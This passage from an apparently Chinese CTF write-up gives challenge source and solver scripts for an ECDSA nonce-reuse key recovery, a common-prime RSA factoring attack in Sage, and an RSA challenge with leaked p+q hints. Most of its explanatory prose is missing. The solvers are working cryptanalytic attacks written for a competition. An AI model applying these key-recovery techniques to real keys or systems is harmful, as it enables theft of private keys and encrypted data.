class="string">&quot;WANGDINGCUP&quot;</span></span><br><span class="line">victory_encrypted_flag = victory_encrypt(flag, victory_key)</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">7</span></span><br><span class="line">xG = <span class="number">0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798</span></span><br><span class="line">yG = <span class="number">0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8</span></span><br><span class="line">G = (xG, yG)</span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line">h = <span class="number">1</span></span><br><span class="line">zero = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">dA = nextprime(random.randint(<span class="number">0</span>, n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> dA &gt; n:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;warning!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addition</span>(<span class="params">t1, t2</span>):</span><br><span class="line">    <span class="keyword">if</span> t1 == zero:</span><br><span class="line">        <span class="keyword">return</span> t2</span><br><span class="line">    <span class="keyword">if</span> t2 == zero:</span><br><span class="line">        <span class="keyword">return</span> t2</span><br><span class="line">    (m1, n1) = t1</span><br><span class="line">    (m2, n2) = t2</span><br><span class="line">    <span class="keyword">if</span> m1 == m2:</span><br><span class="line">        <span class="keyword">if</span> n1 == <span class="number">0</span> <span class="keyword">or</span> n1 != n2:</span><br><span class="line">            <span class="keyword">return</span> zero</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k = (<span class="number">3</span> * m1 * m1 + a) % p * gmpy2.invert(<span class="number">2</span> * n1 , p) % p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = (n2 - n1 + p) % p * gmpy2.invert((m2 - m1 + p) % p, p) % p</span><br><span class="line">    m3 = (k * k % p - m1 - m2 + p * <span class="number">2</span>) % p</span><br><span class="line">    n3 = (k * (m1 - m3) % p - n1 + p) % p</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(m3),<span class="built_in">int</span>(n3))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiplication</span>(<span class="params">x, k</span>):</span><br><span class="line">    ans = zero</span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(t &lt;= k):</span><br><span class="line">        <span class="keyword">if</span> (k &amp;t )&gt;<span class="number">0</span>:</span><br><span class="line">            ans = addition(ans, x)</span><br><span class="line">        x = addition(x, x)</span><br><span class="line">        t &lt;&lt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrs</span>(<span class="params">z, k</span>):</span><br><span class="line">    (xp, yp) = P</span><br><span class="line">    r = xp</span><br><span class="line">    s = (z + r * dA % n) % n * gmpy2.invert(k, n) % n</span><br><span class="line">    <span class="keyword">return</span> r,s</span><br><span class="line"></span><br><span class="line">z1 = random.randint(<span class="number">0</span>, p)</span><br><span class="line">z2 = random.randint(<span class="number">0</span>, p)</span><br><span class="line">k = random.randint(<span class="number">0</span>, n)</span><br><span class="line">P = multiplication(G, k)</span><br><span class="line">hA = multiplication(G, dA)</span><br><span class="line">r1, s1 = getrs(z1, k)</span><br><span class="line">r2, s2 = getrs(z2, k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(s2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;z1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(z1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;z2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(z2))</span><br><span class="line"></span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC)</span><br><span class="line">iv = cipher.iv</span><br><span class="line">encrypted_flag = cipher.encrypt(pad(victory_encrypted_flag.encode(), AES.block_size))</span><br><span class="line">encrypted_flag_hex = binascii.hexlify(iv + encrypted_flag).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted flag (AES in CBC mode, hex):&quot;</span>, encrypted_flag_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># r1 = 11455446275324978121918764201975007376236576456980676251003353868423934779741</span></span><br><span class="line"><span class="comment"># r2 = 11455446275324978121918764201975007376236576456980676251003353868423934779741</span></span><br><span class="line"><span class="comment"># s1 = 40939314972385973234538799073526528418921185412931089406906904671430814294251</span></span><br><span class="line"><span class="comment"># s2 = 20521265832237322311837491925934175279870547563516618597235100170259508682349</span></span><br><span class="line"><span class="comment"># z1 = 86373733089658748931377346977504497606857910789811212034370600969224209571891</span></span><br><span class="line"><span class="comment"># z2 = 114906325375159287808320541183977807561041047925384600130919891200501605749979</span></span><br><span class="line"><span class="comment"># (&#x27;Encrypted flag (AES in CBC mode, hex):&#x27;, u&#x27;57608ba208813e738e7a354399e77272017548f9abf0da7a179a1136cda57579720b68a3ed46d85f5997c35af18f42175f43e856a0f64d964e7ab1e8a672b689&#x27;)</span></span><br></pre></td></tr></table></figure><p><code>AI</code></p><p><code>ECDSA</code><code>r1</code><code>r2</code><code>s1</code><code>s2</code><code>k</code></p><p><code>k = (z1-z2)*inverse(s1-s2, n) % n</code><code>k</code></p><p><code>s = (z + r * dA % n) % n * gmpy2.invert(k, n) % n</code><br /><code>dA</code><code>dA = (s1*k-z1)*inverse(r1, n) % n</code></p><p><code>n</code><code>AI</code><code>kdA</code></p><p><code>exp</code><code>flag</code><code>flag</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">r1 = <span class="number">11455446275324978121918764201975007376236576456980676251003353868423934779741</span></span><br><span class="line">r2 = <span class="number">11455446275324978121918764201975007376236576456980676251003353868423934779741</span></span><br><span class="line">s1 = <span class="number">40939314972385973234538799073526528418921185412931089406906904671430814294251</span></span><br><span class="line">s2 = <span class="number">20521265832237322311837491925934175279870547563516618597235100170259508682349</span></span><br><span class="line">z1 = <span class="number">86373733089658748931377346977504497606857910789811212034370600969224209571891</span></span><br><span class="line">z2 = <span class="number">114906325375159287808320541183977807561041047925384600130919891200501605749979</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line">k = (z1-z2)*inverse(s1-s2, n) % n</span><br><span class="line">dA = (s1*k-z1)*inverse(r1, n) % n</span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line">enc_flag = long_to_bytes(</span><br><span class="line">    <span class="number">0x57608ba208813e738e7a354399e77272017548f9abf0da7a179a1136cda57579720b68a3ed46d85f5997c35af18f42175f43e856a0f64d964e7ab1e8a672b689</span>)</span><br><span class="line">iv = enc_flag[:<span class="number">16</span>]</span><br><span class="line">dec_flag = enc_flag[<span class="number">16</span>:]</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">dec_flag = unpad(aes.decrypt(dec_flag),</span><br><span class="line">                 AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Vigenre</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">victory_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    key = key.upper()</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    ciphertext = ciphertext.upper()</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertext):</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift = <span class="built_in">ord</span>(key[i % key_length]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>(</span><br><span class="line">                (<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            plaintext += decrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">victory_key = <span class="string">&quot;WANGDINGCUP&quot;</span></span><br><span class="line">flag = victory_decrypt(dec_flag, victory_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered flag:&quot;</span>, flag.lower())</span><br><span class="line"><span class="comment"># Recovered flag: wdflag&#123;8ed62e3b409bb214e6fdb0a78f63569c&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc003"><a class="markdownIt-Anchor" href="#misc003"></a> misc003</h2><p><code>wireshark</code><code>IPv4</code><br /><img src="https://picx.zhimg.com/80/v2-7857a7189c6729bffb6e3b2b3eda1933_1440w.png" alt="" /><br /><code>flag</code></p><h2 id="misc004"><a class="markdownIt-Anchor" href="#misc004"></a> misc004</h2><p><br />6<code>IrisCTF2024</code><code>peano</code><br /><a href="https://zhuanlan.zhihu.com/p/305623626">https://zhuanlan.zhihu.com/p/305623626</a><br /><a href="https://almostgph.github.io/2024/01/08/IrisCTF2024/#the-peano-scramble">https://almostgph.github.io/2024/01/08/IrisCTF2024/#the-peano-scramble</a></p><h2 id="web001"><a class="markdownIt-Anchor" href="#web001"></a> web001</h2><p><br /><a href="https://ctftime.org/writeup/30541">https://ctftime.org/writeup/30541</a><br /><code>DownUnderCTF2021</code><br /></p><h2 id="web002"><a class="markdownIt-Anchor" href="#web002"></a> web002</h2><p><code>xss</code></p><h1 id="s8"><a class="markdownIt-Anchor" href="#s8"></a> s8</h1><p><a href="https://blog.s1um4i.com/2024-QWBCTF/">https://blog.s1um4i.com/2024-QWBCTF/</a></p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="givemesecret"><a class="markdownIt-Anchor" href="#givemesecret"></a> givemesecret</h3><p><img src="https://picx.zhimg.com/80/v2-a0d74544a80d641bf4f7fe7f5efadaab_1440w.png" alt="" /></p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="easyrsa"><a class="markdownIt-Anchor" href="#easyrsa"></a> EasyRSA</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">import</span> random, gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAEncryptor</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">self.g = self.a = self.b = <span class="number">0</span></span><br><span class="line">self.e = <span class="number">65537</span></span><br><span class="line">self.factorGen()</span><br><span class="line">self.product()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorGen</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">self.g = getPrime(<span class="number">500</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(<span class="number">2</span>*self.g*self.a+<span class="number">1</span>):</span><br><span class="line">self.a = random.randint(<span class="number">2</span>**<span class="number">523</span>, <span class="number">2</span>**<span class="number">524</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(<span class="number">2</span>*self.g*self.b+<span class="number">1</span>):</span><br><span class="line">self.b = random.randint(<span class="number">2</span>**<span class="number">523</span>, <span class="number">2</span>**<span class="number">524</span>)</span><br><span class="line">self.h = <span class="number">2</span>*self.g*self.a*self.b+self.a+self.b</span><br><span class="line"><span class="keyword">if</span> gmpy2.is_prime(self.h):</span><br><span class="line">self.N = <span class="number">2</span>*self.h*self.g+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(self.N)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, msg</span>):</span><br><span class="line"><span class="keyword">return</span> gmpy2.powmod(msg, self.e, self.N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">product</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">self.flag = f.read()</span><br><span class="line">self.enc = self.encrypt(self.flag)</span><br><span class="line">self.show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;self.enc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N=<span class="subst">&#123;self.N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e=<span class="subst">&#123;self.e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;g=<span class="subst">&#123;self.g&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RSAEncryptor()</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>2</mn><mi>a</mi><mi>g</mi><mo></mo><mn>2</mn><mi>b</mi><mi>g</mi><mo>+</mo><mn>2</mn><mi>a</mi><mi>g</mi><mo>+</mo><mn>2</mn><mi>b</mi><mi>g</mi><mo>+</mo><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2</mn><mi>a</mi><mi>g</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo></mo><mo stretchy="false">(</mo><mn>2</mn><mi>b</mi><mi>g</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">N=2ag*2bg+2ag+2bg+1=(2ag+1)*(2bg+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>RSA</p><p><a href="https://tangcuxiaojikuai.xyz/post/ce38099f.html">https://tangcuxiaojikuai.xyz/post/ce38099f.html</a><br /><a href="https://hasegawaazusa.github.io/common-prime-rsa.html">https://hasegawaazusa.github.io/common-prime-rsa.html</a><br />gamma</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.groups.generic <span class="keyword">import</span> bsgs</span><br><span class="line"></span><br><span class="line">g = </span><br><span class="line">N = </span><br><span class="line">e = </span><br><span class="line">enc = </span><br><span class="line">nbits = <span class="number">2048</span></span><br><span class="line">gamma = <span class="number">0.2446</span></span><br><span class="line">cbits = ceil(nbits * (<span class="number">0.5</span> - <span class="number">2</span> * gamma))</span><br><span class="line"></span><br><span class="line">M = (N - <span class="number">1</span>) // (<span class="number">2</span> * g)</span><br><span class="line">u = M // (<span class="number">2</span> * g)</span><br><span class="line">v = M - <span class="number">2</span> * g * u</span><br><span class="line">GF = Zmod(N)</span><br><span class="line">x = GF.random_element()</span><br><span class="line">y = x ^ (<span class="number">2</span> * g)</span><br><span class="line"><span class="comment"># cN^(0.5-2*gamma)</span></span><br><span class="line">c = bsgs(y, y ^ u, (Integer(<span class="number">2</span>**(cbits-<span class="number">1</span>)), Integer(<span class="number">2</span>**(cbits+<span class="number">1</span>))))</span><br><span class="line">ab = u - c</span><br><span class="line">apb = v + <span class="number">2</span> * g * c</span><br><span class="line">P.&lt;x&gt; = ZZ[]</span><br><span class="line">f = x ^ <span class="number">2</span> - apb * x + ab</span><br><span class="line">a = f.roots()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line">    a, b = a[<span class="number">0</span>][<span class="number">0</span>], a[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">    q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> p * q == N</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(enc,d,N))).decode())</span><br></pre></td></tr></table></figure><h3 id="apbq"><a class="markdownIt-Anchor" href="#apbq"></a> apbq</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, privatekey, publickey</span>):</span><br><span class="line">        self.p, self.q, self.d = privatekey</span><br><span class="line">        self.n, self.e = publickey</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(plaintext, <span class="built_in">bytes</span>):</span><br><span class="line">            plaintext = bytes_to_long(plaintext)</span><br><span class="line">        ciphertext = <span class="built_in">pow</span>(plaintext, self.e, self.n)</span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(ciphertext, <span class="built_in">bytes</span>):</span><br><span class="line">            ciphertext = bytes_to_long(ciphertext)</span><br><span class="line">        plaintext = <span class="built_in">pow</span>(ciphertext, self.d, self.n)</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_keypair</span>(<span class="params">nbits, e = <span class="number">65537</span></span>):</span><br><span class="line">    p = getPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    q = getPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    d = inverse(e, n - p - q + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (p, q, d), (n, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pt = <span class="string">&#x27;./output.txt&#x27;</span></span><br><span class="line">    fout = <span class="built_in">open</span>(pt, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    sys.stdout = fout</span><br><span class="line"></span><br><span class="line">    block_size = ceil(<span class="built_in">len</span>(flag)/<span class="number">3</span>)</span><br><span class="line">    flag = [flag[i:i+block_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), block_size)]</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Welcome to my apbq game&#x27;</span>)</span><br><span class="line">    <span class="comment"># stage 1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; stage 1: p + q&#x27;</span>)</span><br><span class="line">    prikey1, pubkey1 = get_keypair(<span class="number">1024</span>)</span><br><span class="line">    RSA1 = RSA(prikey1, pubkey1)</span><br><span class="line">    enc1 = RSA1.encrypt(flag[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; hints = <span class="subst">&#123;prikey1[<span class="number">0</span>] + prikey1[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; public key = <span class="subst">&#123;pubkey1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; enc1 = <span class="subst">&#123;enc1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;----------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage 2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; stage 2: ai*p + bi*q&#x27;</span>)</span><br><span class="line">    prikey2, pubkey2 = get_keypair(<span class="number">1024</span>)</span><br><span class="line">    RSA2 = RSA(prikey2, pubkey2)</span><br><span class="line">    enc2 = RSA2.encrypt(flag[<span class="number">1</span>])</span><br><span class="line">    kbits = <span class="number">180</span></span><br><span class="line">    a = [getRandomNBitInteger(kbits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    b = [getRandomNBitInteger(kbits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    c = [a[i]*prikey2[<span class="number">0</span>] + b[i]*prikey2[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; hints = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; public key = <span class="subst">&#123;pubkey2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; enc2 = <span class="subst">&#123;enc2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;----------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage 3</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; stage 3: a*p + q, p + bq&#x27;</span>)</span><br><span class="line">    prikey3, pubkey3 = get_keypair(<span class="number">1024</span>)</span><br><span class="line">    RSA3 = RSA(prikey3, pubkey3)</span><br><span class="line">    enc3 = RSA2.encrypt(flag[<span class="number">2</span>])</span><br><span class="line">    kbits = <span class="number">512</span></span><br><span class="line">    a = getRandomNBitInteger(kbits)</span><br><span class="line">    b = getRandomNBitInteger(kbits)</span><br><span class="line">    c1 = a*prikey3[<span class="number">0</span>] + prikey3[<span class="number">1</span>]</span><br><span class="line">    c2 = prikey3[<span class="number">0</span>] + b*prikey3[<span class="number">1</span>] </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; hints = <span class="subst">&#123;c1, c2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; public key = <span class="subst">&#123;pubkey3&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; enc3 = <span class="subst">&#123;enc3&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag1: </span><br><span class="line"></span><br><span class="line">flag2</span><br><span class="line">&lt;https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/apbq-rsa-ii/solve/solv.sage&gt;</span><br><span class="line">&lt;https://blog.maple3142.net/2023/09/03/downunderctf-2023-writeups/&gt;</span><br><span class="line"></span><br><span class="line">flag3&lt;https://connor-mccartney.github.io/cryptography/rsa/BLAHAJ-angstrom-CTF-2024&gt;</span><br></pre></td></tr></table></figure><p><code>flag3</code><code>RSA2</code><br /><code>pq</code><br /><code>flag2</code><code>DownUnderCTF</code><code>pq</code><code>100</code><code>pq</code></p><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols,solve</span><br><span class="line"></span><br><span class="line">p_q = <span class="number">18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span></span><br><span class="line">n, e = (<span class="number">89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589</span>, <span class="number">65537</span>)</span><br><span class="line">enc1 = <span class="number">23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span></span><br><span class="line">p, q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">res = solve([p*q-n, p+q-p_q], [p, q])</span><br><span class="line">p, q = res[<span class="number">0</span>]</span><br><span class="line">p = <span class="built_in">int</span>(p)</span><br><span class="line">q = <span class="built_in">int</span>(q)</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag1 = 